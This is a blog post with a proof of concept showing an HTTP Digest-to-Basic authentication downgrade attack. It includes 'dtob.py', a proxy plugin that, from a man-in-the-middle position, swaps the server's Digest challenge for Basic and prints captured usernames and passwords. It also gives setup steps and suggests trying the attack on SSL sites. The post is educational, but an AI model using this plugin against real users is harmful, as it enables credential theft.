<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>dtob.py: Digest to Basic authentication; A simple example of a authentication 'downgrade' attack | #!/bin/note
</title>
<meta name=keywords content>
<meta name=description content="Introduction
Lets start by saying that I am by no means an expert at any of what I am about to write. Primarily this post is purely for research purposes. Think of it as one of those something to do scenarios. I&rsquo;d like to cover some basics around HTTP Authentication, and then show a PoC of how this can be abused in a real world scenario. Hopefully this will help educate people to use more secure authentication mechanisms! :)">
<meta name=author content="Leon Jacobs">
<link rel=canonical href=https://leonjza.github.io/blog/2013/06/25/dtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://leonjza.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="dtob.py: Digest to Basic authentication; A simple example of a authentication 'downgrade' attack">
<meta property="og:description" content="Introduction
Lets start by saying that I am by no means an expert at any of what I am about to write. Primarily this post is purely for research purposes. Think of it as one of those something to do scenarios. I&rsquo;d like to cover some basics around HTTP Authentication, and then show a PoC of how this can be abused in a real world scenario. Hopefully this will help educate people to use more secure authentication mechanisms! :)">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2013/06/25/dtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2013-06-25T00:00:00+00:00">
<meta property="article:modified_time" content="2013-06-25T00:00:00+00:00"><meta property="og:site_name" content="#!/bin/note
">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="dtob.py: Digest to Basic authentication; A simple example of a authentication 'downgrade' attack">
<meta name=twitter:description content="Introduction
Lets start by saying that I am by no means an expert at any of what I am about to write. Primarily this post is purely for research purposes. Think of it as one of those something to do scenarios. I&rsquo;d like to cover some basics around HTTP Authentication, and then show a PoC of how this can be abused in a real world scenario. Hopefully this will help educate people to use more secure authentication mechanisms! :)">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"dtob.py: Digest to Basic authentication; A simple example of a authentication 'downgrade' attack","item":"https://leonjza.github.io/blog/2013/06/25/dtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"dtob.py: Digest to Basic authentication; A simple example of a authentication 'downgrade' attack","name":"dtob.py: Digest to Basic authentication; A simple example of a authentication \u0027downgrade\u0027 attack","description":"Introduction Lets start by saying that I am by no means an expert at any of what I am about to write. Primarily this post is purely for research purposes. Think of it as one of those something to do scenarios. I\u0026rsquo;d like to cover some basics around HTTP Authentication, and then show a PoC of how this can be abused in a real world scenario. Hopefully this will help educate people to use more secure authentication mechanisms! :)\n","keywords":[],"articleBody":"Introduction Lets start by saying that I am by no means an expert at any of what I am about to write. Primarily this post is purely for research purposes. Think of it as one of those something to do scenarios. I’d like to cover some basics around HTTP Authentication, and then show a PoC of how this can be abused in a real world scenario. Hopefully this will help educate people to use more secure authentication mechanisms! :)\nAuthentication at a HTTP Level HTTP Level authentication, for the most part, rely on a set of headers to authenticate the user. Generally speaking, the server will present the expected authentication mechanism via a WWW-Authenticate header, and expect the client to prepare the correct response back. Each request the user makes after a successful authentication attempt, has to contain the correct headers for the applicable authentication scheme, else the server would normally respond with a 401 - Not Authorised, and the client has to re-authenticate. It is up to the server/application to validate the headers on each request. HTTP level authentication mechanisms include Basic, Digest as well as more complex schemes such as Kerberos, NTLM and OAuth\nIt is important to note that even though you are using say, Digest authentication, it is entirely up to the backend systems to validate the credentials. Whether it is some backend database, RADIUS server, LDAP etc. that stores your valid set of credentials does not matter. The server and the client, on a HTTP level, will be exchanging these headers.\nFor the purpose of this article, I will focus a little on the arguably less complex mechanisms, Basic and Digest.\nHTTP Basic Authentication Basic authentication is considered the least secure method of HTTP authentication. Why is this exactly? Well, the credentials used to authenticate you as a user is sent over the wire in a Base64 encoded string. Base64 is a encoding scheme, and not an encryption scheme [1].\nTo demonstrate this, lets assume we have a website that wants to make use of basic authentication. A sample request header would look like:\nGET /auth/basic/ HTTP/1.1 Host: test.dev Proxy-Connection: keep-alive Cache-Control: max-age=0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36 DNT: 1 Accept-Encoding: gzip,deflate,sdch Accept-Language: en-US,en;q=0.8,af;q=0.6 The website, configured to use basic authentication, will see that there is no Authorisation header presented by the client, and respond with a 401, as well as a WWW-Authenticate header.\nHTTP/1.0 401 Unauthorised Date: Tue, 25 Jun 2013 17:33:37 GMT Server: Apache/2.2.22 (Unix) DAV/2 PHP/5.3.15 with Suhosin-Patch mod_ssl/2.2.22 OpenSSL/0.9.8x X-Powered-By: PHP/5.3.15 WWW-Authenticate: Basic realm=\"Basic Auth Testing\" Content-Length: 39 Connection: close Content-Type: text/html Text to send if user hits Cancel button The response we got when attempting to access the website told us that we need to provide a authentication response first. Based on the WWW-Authenticate header, this mechanism should be Basic for the realm Basic Auth Testing. Don’t stress too much about the realm part. In short, this is usually used to give the user a short message like “Restricted Area” etc. In the authentication dialog that the browser presents, we provide some credentials, and submit them for processing. Your browser now goes and prepares the Authorisation header.\nGET /auth/basic/ HTTP/1.1 Host: test.dev Proxy-Connection: keep-alive Cache-Control: max-age=0 Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36 DNT: 1 Accept-Encoding: gzip,deflate,sdch Accept-Language: en-US,en;q=0.8,af;q=0.6 Because my credentials are correct, the server will respond now with a 200 and serve the content. But, lets take a quick step back and check out what is actually in this header. More specifically, check out the Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk part. This header now needs to be present in every request that is made to the website. If for whatever reason the credentials are no longer valid, the server/application will usually respond with a 401 again, and the authentication will re-occur. The user normally does not have to do anything, as the browser will automatically include the Authorization header in every request.\nOk, so what? So lets take a moment and relook at the Authorisation header. Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk Lets strip the Authorisation: Basic section and just work with the dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk. We will echo this, and pipe it through a base64 decoder in a shell session:\n$ echo \"dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk\" | base64 -d user.name:s3cr3tP@ssw0rd $ Yup, thats it…\nIt is now clear to see that for HTTP Basic authentication, the browser will take the credentials that the user has provided, and create the header in the format: Authorisation: Basic + base64(username:password). If you are protecting a non-SSL web resource with this authentication mechanism, you are essentially asking your users to send their credentials unencrypted over the wire to you for every requset.\nHTTP Digest Authentication Digest authentication is considered to be more secure, as it actually applies a hash function to the credentials, before passing the header on to the server. For the sake of brevity, lets assume the server will act in a similar fashion to the Basic Authentication example above, except, the WWW-Authenticate and Authorisation headers are completely different. You are of course welcome to check it out yourself, and I would encourage you do so!\nLets look at an example, and then dig into the details. Requesting a digest protected web resource @/login without a valid Authorisation header, will cause our sample application to respond with a 401 and a WWW-Authenticate header as follows:\nWWW-Authenticate: Digest realm=\"test.dev\",qop=\"auth\",nonce=\"064af982c5b571cea6450d8eda91c20d\",opaque=\"d8ea7aa61a1693024c4cc3a516f49b3c\" Just as the Basic example, the browser will prompt the user for credentials now and prepare the response. The response then to the server would include the following Authorisation header:\nAuthorisation: Digest username=\"user.name\", realm=\"test.dev\", nonce=\"064af982c5b571cea6450d8eda91c20d\", uri=\"/login\", response=\"70eda34f1683041fd9ab72056c51b740\", opaque=\"d8ea7aa61a1693024c4cc3a516f49b3c\", qop=auth, nc=00000001, cnonce=\"61417766e50cb980\" Clearly the response here is much more complex when compared to the Basic example. So, lets refer to the Wikipedia Article here, or the official RFC here to help us understand what is going on here.\nAccording to the Wikipedia article, the response Authorisation header for Digest authentication for RFC 2617 is calculated as follows:\n# If the algorithm directive in the WWW-Authenticate header is 'MD5' or unspecified ha1 = md5(username : realm : password) # Else, if the algorithm directive is 'MD5-Sess', the nonce and client nonce becomes part of ha1 ha1 = md5(md5(username : realm : password) : nonce : cnonce) # For ha2, if the qop directive is 'auth' or unspecified ha2 = md5(method : digestURI) # Else, if the qop directive is 'auth-int' # Where entity body is the actual response HTML from the doctype down to the last . See: http://www.w3.org/Protocols/rfc2616/rfc2616-sec7.html#sec7 ha2 = md5(method : digestURI : md5(entityBody)) # Lastly, for the response, if the qop directive is 'auth' or 'auth-int' response = md5(ha1 : nonce : nonceCount : clientNonce : qop : ha2) # Else, if qop is unspecified response = md5(ha1 : nonce : ha2) So, lets take this formula, step by step and try and replicate the response Authorisation header in a shell. If one of the WWW-Authenticate headers don’t make sense then I’ll highly reccomend you read the RFC.\n# Example of Calculating a Digest Authentication Response # header in a shell with a qop of \"auth\" # Assign some values to variables. These values will come from the above headers qop=\"auth\" realm=\"test.dev\" nonce=\"064af982c5b571cea6450d8eda91c20d\" uri=\"/login\" cnonce=\"61417766e50cb980\" nc=\"00000001\" username=\"user.name\" # This is what the user enters password=\"s3cr3tP@ssw0rd\" # This is what the user enters method=\"GET\" # Start off with calculating ha1. # We do not have the algorithm directive specified, so ha1 is calculated as: $ ha1=`echo -n $username\":\"$realm\":\"$password | md5` # Confirm that the value is set. $ print $ha1 d5d7ef83a9b3ad5bb0b5201b2bace033 # Next calculate the value of ha2. # Our application presented the qop directive as 'auth', so ha2 is calculated as: $ ha2=`echo -n $method\":\"$uri | md5` # Again, confirm that its set. $ print $ha2 315c3fb2f18fd4c6e5a3175e489464ad # With both 'ha1' and 'ha2' set, we can calculate the response # We have the qop directive specified, so our response is calculated as: $ response=`echo -n $ha1\":\"$nonce\":\"$nc\":\"$cnonce\":\"$qop\":\"$ha2 | md5` # And did we get the right response? $ print $response 70eda34f1683041fd9ab72056c51b740 70eda34f1683041fd9ab72056c51b740 is the valid response header for this request. Note that the next client request will set nc=00000002 and therefore the response will be different due to this value being part of the response calculation. However, the fact remains that the authorisation is continuously done via header exchanges between the client and the server, relying on the server to validate them.\nIt is also clear that this can not be easily reversed. Even though some attributes that make up the hash function are known, the username and password are at least hashed and factored into the response attribute. It is not impossible, though not as easy as Basic authentication.\nO..K.. so I now get how the Basic vs Digest stuff works, whats next? What if we could make the browser think that the server wants basic authentication, and then capture the encdoded credentials? That would mean we dont need any l33t cracking skeelz or anything. Just a base64 -d.\nDowngrade all the auth! Assuming you are able to get some form of MiTM between the client and the server, by whichever means you use, we can intercept the headers and change them to tell the browser that we actually want basic authentication. Remember, the browser responds based on what the server asks, so if the server only asks for Basic authentication… :D\n“Downgrade” attacks are a known flaw in Digest authentication. Where Digest authentication is not necessarily vulnerable to MiTM attacks in the sense that the hash still needs to be cracked, Basic authentication is and therefore such an attack can prove to be valuable to an attacker.\nEnough talk, PoC! Using proxpy, which is a pluggable python proxy server, I wrote a PoC demoing this exact attack. There are a lot of scenarios where this doesn’t work very well, but this is only meant to demonstrate the problem.\nThe plugin # dtob.py # Digest to Basic downgrade attack PoC plugin for proxpy (https://code.google.com/p/proxpy/) # # 2013 Leon Jacobs # Licensed under IDC (I don't Care) license. import base64 import hashlib def headerCleanup(v): # strip annoying bracket things v = v.translate(None, \"'[\\\\'\") v = v.translate(None, \"\\\\']'\") # convert it to a list headers = v.split(', ') return headers def proxy_mangle_request(req): v = str(req.getHeader(\"Authorization\")) headers = headerCleanup(v) if 'Basic' in headers[0]: print \"[*] Basic Auth Response Detected.\" credentials = headers[0].split(\" \") credentials = base64.b64decode(credentials[1]).split(\":\") print \"[!] Found username '%s' and password '%s' for URL %s\" % (credentials[0], credentials[1], str(req.url)) if 'Digest' in headers[0]: print \"[x] Aww, the client responded with a Digest. \\\"Were too late!\\\":(\" return req def proxy_mangle_response(res): v = str(res.getHeader(\"WWW-Authenticate\")) headers = headerCleanup(v) if 'Digest' in headers[0]: # Swap out Digest for Basic : header = str(headers[0]) print \"[*] Found digest auth. Masquerading the response with a basic one :\" res.setHeader(\"WWW-Authenticate\", \"Basic realm=pwnd\") return res Lets get to it.\n  At the core, this authentication downgrade attack PoC leverages off the ability to perform a MiTM between the client and server. How you get this MiTM is out of the scope of this article, but bear in mind that MiTM is not just arp spoofing clients. You could NAT web traffic to your proxy too… :)\n  Download proxpy and extract it to a working directory.\n  Download and save the plugin from here into the plugins/ directory in your proxpy working directory.\n  Start the proxy, specifying the port you’d like it to run on, as well as telling it to load the plugin. A sample command to get this running would be: python proxpy.py -p 8090 -x plugins/dtob.py\n  Ensure that your MiTM is successful, and watch as digest authentication gets downgraded to basic auth, and your credentials echoed to the terminal :P Something like this…\n    What is the user experience with this? That is a good question. The actual dialog that the user sees, again, is up to the browser to render. Depending on which browser you use on which OS, this may look different. In the back, the client should function normally, blissfully unaware that the headers for stronger authentication were swapped out.\nOn my computer, the authentication dialog has the follow look and feel:\n  Notice the “Server Says:” Section. This is typically the realm part of the authentication request. When using the dtob.py plugin, it is changed to pwnd. This dialog looks no different when using any form of HTTP based authentication. Hence, when the downgrade attack occurs, the user is unaware that anything different is happening in the background.\nTo wrap it up A few things to note here. Regardless of the HTTP Authentication method used, the client will not know which authentication method is actually being used without inspecting the headers etc. The plugin can technically be written to keep track of which URL’s require Digest auth, and prepare valid responses ( like the one we did in the shell ) and present that back to the server. This will make the process completely smooth and the client unaware that something is going on. In the plugins current state, it will just continuously prompt the user for authentication as the proper request with the correct Authorisation header is never sent to the server.\nOn the case of SSL websites it obviously gets a little more tricky. Don’t be put off with this. Countless times have I seen where users simply click the “proceed anyways” button regardless of the certificate validation errors that the browser presents them with. So, even though you will raise alarms on SSL encrypted websites, its still worth a try ^^\n","wordCount":"2270","inLanguage":"en","datePublished":"2013-06-25T00:00:00Z","dateModified":"2013-06-25T00:00:00Z","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2013/06/25/dtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
 (Alt + H)">#!/bin/note
</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://leonjza.github.io/about/ title="About Me">
<span>About Me</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/archives title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/categories title=Categories>
<span>Categories</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
<h1 class=post-title>
dtob.py: Digest to Basic authentication; A simple example of a authentication 'downgrade' attack
</h1>
<div class=post-meta>June 25, 2013&nbsp;·&nbsp;11 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2013-06-25-dtob-dot-py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#introduction aria-label=Introduction>Introduction</a></li>
<li>
<a href=#authentication-at-a-http-level aria-label="Authentication at a HTTP Level">Authentication at a HTTP Level</a></li>
<li>
<a href=#http-basic-authentication aria-label="HTTP Basic Authentication">HTTP Basic Authentication</a><ul>
<li>
<a href=#ok-so-what aria-label="Ok, so what?">Ok, so what?</a></li></ul>
</li>
<li>
<a href=#http-digest-authentication aria-label="HTTP Digest Authentication">HTTP Digest Authentication</a></li>
<li>
<a href=#ok-so-i-now-get-how-the-basic-vs-digest-stuff-works-whats-next aria-label="O..K.. so I now get how the Basic vs Digest stuff works, whats next?">O..K.. so I now get how the Basic vs Digest stuff works, whats next?</a></li>
<li>
<a href=#downgrade-all-the-auth aria-label="Downgrade all the auth!">Downgrade all the auth!</a></li>
<li>
<a href=#enough-talk-poc aria-label="Enough talk, PoC!">Enough talk, PoC!</a><ul>
<li>
<a href=#the-plugin aria-label="The plugin">The plugin</a></li></ul>
</li>
<li>
<a href=#what-is-the-user-experience-with-this aria-label="What is the user experience with this?">What is the user experience with this?</a></li>
<li>
<a href=#to-wrap-it-up aria-label="To wrap it up">To wrap it up</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><h3 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h3>
<p>Lets start by saying that I am by <em>no</em> means an expert at any of what I am about to write. Primarily this post is purely for research purposes. Think of it as one of those <em>something to do</em> scenarios. I&rsquo;d like to cover some basics around HTTP Authentication, and then show a PoC of how this can be abused in a real world scenario. Hopefully this will help educate people to use more secure authentication mechanisms! :)</p>
<h3 id=authentication-at-a-http-level>Authentication at a HTTP Level<a hidden class=anchor aria-hidden=true href=#authentication-at-a-http-level>#</a></h3>
<p>HTTP Level authentication, for the most part, rely on a set of headers to authenticate the user. Generally speaking, the server will present the expected authentication mechanism via a <code>WWW-Authenticate</code> header, and expect the client to prepare the correct response back. Each request the user makes after a successful authentication attempt, has to contain the correct headers for the applicable authentication scheme, else the server would normally respond with a <code>401 - Not Authorised</code>, and the client has to re-authenticate. It is up to the server/application to validate the headers on each request.
HTTP level authentication mechanisms include <a href=http://tools.ietf.org/html/rfc2617#section-2>Basic</a>, <a href=http://tools.ietf.org/html/rfc2617#section-3>Digest</a> as well as more complex schemes such as <a href=http://tools.ietf.org/html/rfc4559>Kerberos</a>, <a href=http://davenport.sourceforge.net/ntlm.html#ntlmHttpAuthentication>NTLM</a> and <a href=http://oauth.net/core/1.0/#auth_header>OAuth</a></p>
<p>It is important to note that even though you are using say, Digest authentication, it is entirely up to the backend systems to <strong>validate</strong> the credentials. Whether it is some backend database, RADIUS server, LDAP etc. that stores your valid set of credentials does not matter. The server and the client, on a HTTP level, will be exchanging these headers.</p>
<p>For the purpose of this article, I will focus a little on the arguably less complex mechanisms, Basic and Digest.</p>
<h3 id=http-basic-authentication>HTTP Basic Authentication<a hidden class=anchor aria-hidden=true href=#http-basic-authentication>#</a></h3>
<p>Basic authentication is considered the <em>least secure</em> method of HTTP authentication. Why is this exactly? Well, the credentials used to authenticate you as a user is sent over the wire in a Base64 encoded string. Base64 is a <strong>encoding</strong> scheme, and <strong>not</strong> an encryption scheme [<a href=http://en.wikipedia.org/wiki/Base64>1</a>].</p>
<p>To demonstrate this, lets assume we have a website that wants to make use of basic authentication. A sample request header would look like:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>GET /auth/basic/ HTTP/1.1
Host: test.dev
Proxy-Connection: keep-alive
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
DNT: 1
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8,af;q=0.6
</code></pre></div><p>The website, configured to use basic authentication, will see that there is no <code>Authorisation</code> header presented by the client, and respond with a <code>401</code>, as well as a <code>WWW-Authenticate</code> header.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>HTTP/1.0 401 Unauthorised
Date: Tue, 25 Jun 2013 17:33:37 GMT
Server: Apache/2.2.22 (Unix) DAV/2 PHP/5.3.15 with Suhosin-Patch mod_ssl/2.2.22 OpenSSL/0.9.8x
X-Powered-By: PHP/5.3.15
WWW-Authenticate: Basic realm=&#34;Basic Auth Testing&#34;
Content-Length: 39
Connection: close
Content-Type: text/html

Text to send if user hits Cancel button
</code></pre></div><p>The response we got when attempting to access the website told us that we need to provide a authentication response first. Based on the <code>WWW-Authenticate</code> header, this mechanism should be <code>Basic</code> for the realm <em>Basic Auth Testing</em>. Don&rsquo;t stress too much about the realm part. In short, this is usually used to give the user a short message like &ldquo;Restricted Area&rdquo; etc.
In the authentication dialog that the browser presents, we provide some credentials, and submit them for processing. Your browser now goes and prepares the <code>Authorisation</code> header.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>GET /auth/basic/ HTTP/1.1
Host: test.dev
Proxy-Connection: keep-alive
Cache-Control: max-age=0
Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
DNT: 1
Accept-Encoding: gzip,deflate,sdch
Accept-Language: en-US,en;q=0.8,af;q=0.6
</code></pre></div><p>Because my credentials are correct, the server will respond now with a <code>200</code> and serve the content. But, lets take a quick step back and check out what is actually in this header. More specifically, check out the <code>Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk</code> part.
This header now needs to be present in every request that is made to the website. If for whatever reason the credentials are no longer valid, the server/application will usually respond with a <code>401</code> again, and the authentication will re-occur. The user normally does not have to do anything, as the browser will automatically include the Authorization header in every request.</p>
<h4 id=ok-so-what>Ok, so what?<a hidden class=anchor aria-hidden=true href=#ok-so-what>#</a></h4>
<p>So lets take a moment and relook at the <code>Authorisation</code> header. <code>Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk</code>
Lets strip the <em>Authorisation: Basic</em> section and just work with the <code>dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk</code>. We will echo this, and pipe it through a base64 decoder in a shell session:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ echo <span style=color:#e6db74>&#34;dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk&#34;</span> | base64 -d
user.name:s3cr3tP@ssw0rd
$
</code></pre></div><p>Yup, thats it&mldr;</p>
<p>It is now clear to see that for HTTP Basic authentication, the browser will take the credentials that the user has provided, and create the header in the format:
<code>Authorisation: Basic</code> + <strong>base64(username:password)</strong>. If you are protecting a non-SSL web resource with this authentication mechanism, you are essentially asking your users to send their credentials unencrypted over the wire to you for every requset.</p>
<h3 id=http-digest-authentication>HTTP Digest Authentication<a hidden class=anchor aria-hidden=true href=#http-digest-authentication>#</a></h3>
<p>Digest authentication is considered to be <em>more</em> secure, as it actually applies a hash function to the credentials, before passing the header on to the server. For the sake of brevity, lets assume the server will act in a similar fashion to the Basic Authentication example above, except, the <code>WWW-Authenticate</code> and <code>Authorisation</code> headers are completely different. You are of course welcome to check it out yourself, and I would encourage you do so!</p>
<p>Lets look at an example, and then dig into the details. Requesting a digest protected web resource @<em>/login</em> without a valid <code>Authorisation</code> header, will cause our sample application to respond with a <code>401</code> and a <code>WWW-Authenticate</code> header as follows:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>WWW-Authenticate: Digest realm=&#34;test.dev&#34;,qop=&#34;auth&#34;,nonce=&#34;064af982c5b571cea6450d8eda91c20d&#34;,opaque=&#34;d8ea7aa61a1693024c4cc3a516f49b3c&#34;
</code></pre></div><p>Just as the Basic example, the browser will prompt the user for credentials now and prepare the response. The response then to the server would include the following <code>Authorisation</code> header:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>Authorisation: Digest username=&#34;user.name&#34;, realm=&#34;test.dev&#34;, nonce=&#34;064af982c5b571cea6450d8eda91c20d&#34;, uri=&#34;/login&#34;, response=&#34;70eda34f1683041fd9ab72056c51b740&#34;, opaque=&#34;d8ea7aa61a1693024c4cc3a516f49b3c&#34;, qop=auth, nc=00000001, cnonce=&#34;61417766e50cb980&#34;
</code></pre></div><p>Clearly the response here is much more complex when compared to the Basic example. So, lets refer to the Wikipedia Article <a href=http://en.wikipedia.org/wiki/Digest_access_authentication#Overview>here</a>, or the official RFC <a href=http://tools.ietf.org/html/rfc2069#section-2.1.2>here</a> to help us understand what is going on here.</p>
<p>According to the Wikipedia article, the response <code>Authorisation</code> header for Digest authentication for <a href=http://tools.ietf.org/html/rfc2617#section-3.2.2>RFC 2617</a> is calculated as follows:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># If the algorithm directive in the WWW-Authenticate header is &#39;MD5&#39; or unspecified</span>
ha1 <span style=color:#f92672>=</span> md5<span style=color:#f92672>(</span>username : realm : password<span style=color:#f92672>)</span>
<span style=color:#75715e># Else, if the algorithm directive is &#39;MD5-Sess&#39;, the nonce and client nonce becomes part of ha1</span>
ha1 <span style=color:#f92672>=</span> md5<span style=color:#f92672>(</span>md5<span style=color:#f92672>(</span>username : realm : password<span style=color:#f92672>)</span> : nonce : cnonce<span style=color:#f92672>)</span>

<span style=color:#75715e># For ha2, if the qop directive is &#39;auth&#39; or unspecified</span>
ha2 <span style=color:#f92672>=</span> md5<span style=color:#f92672>(</span>method : digestURI<span style=color:#f92672>)</span>
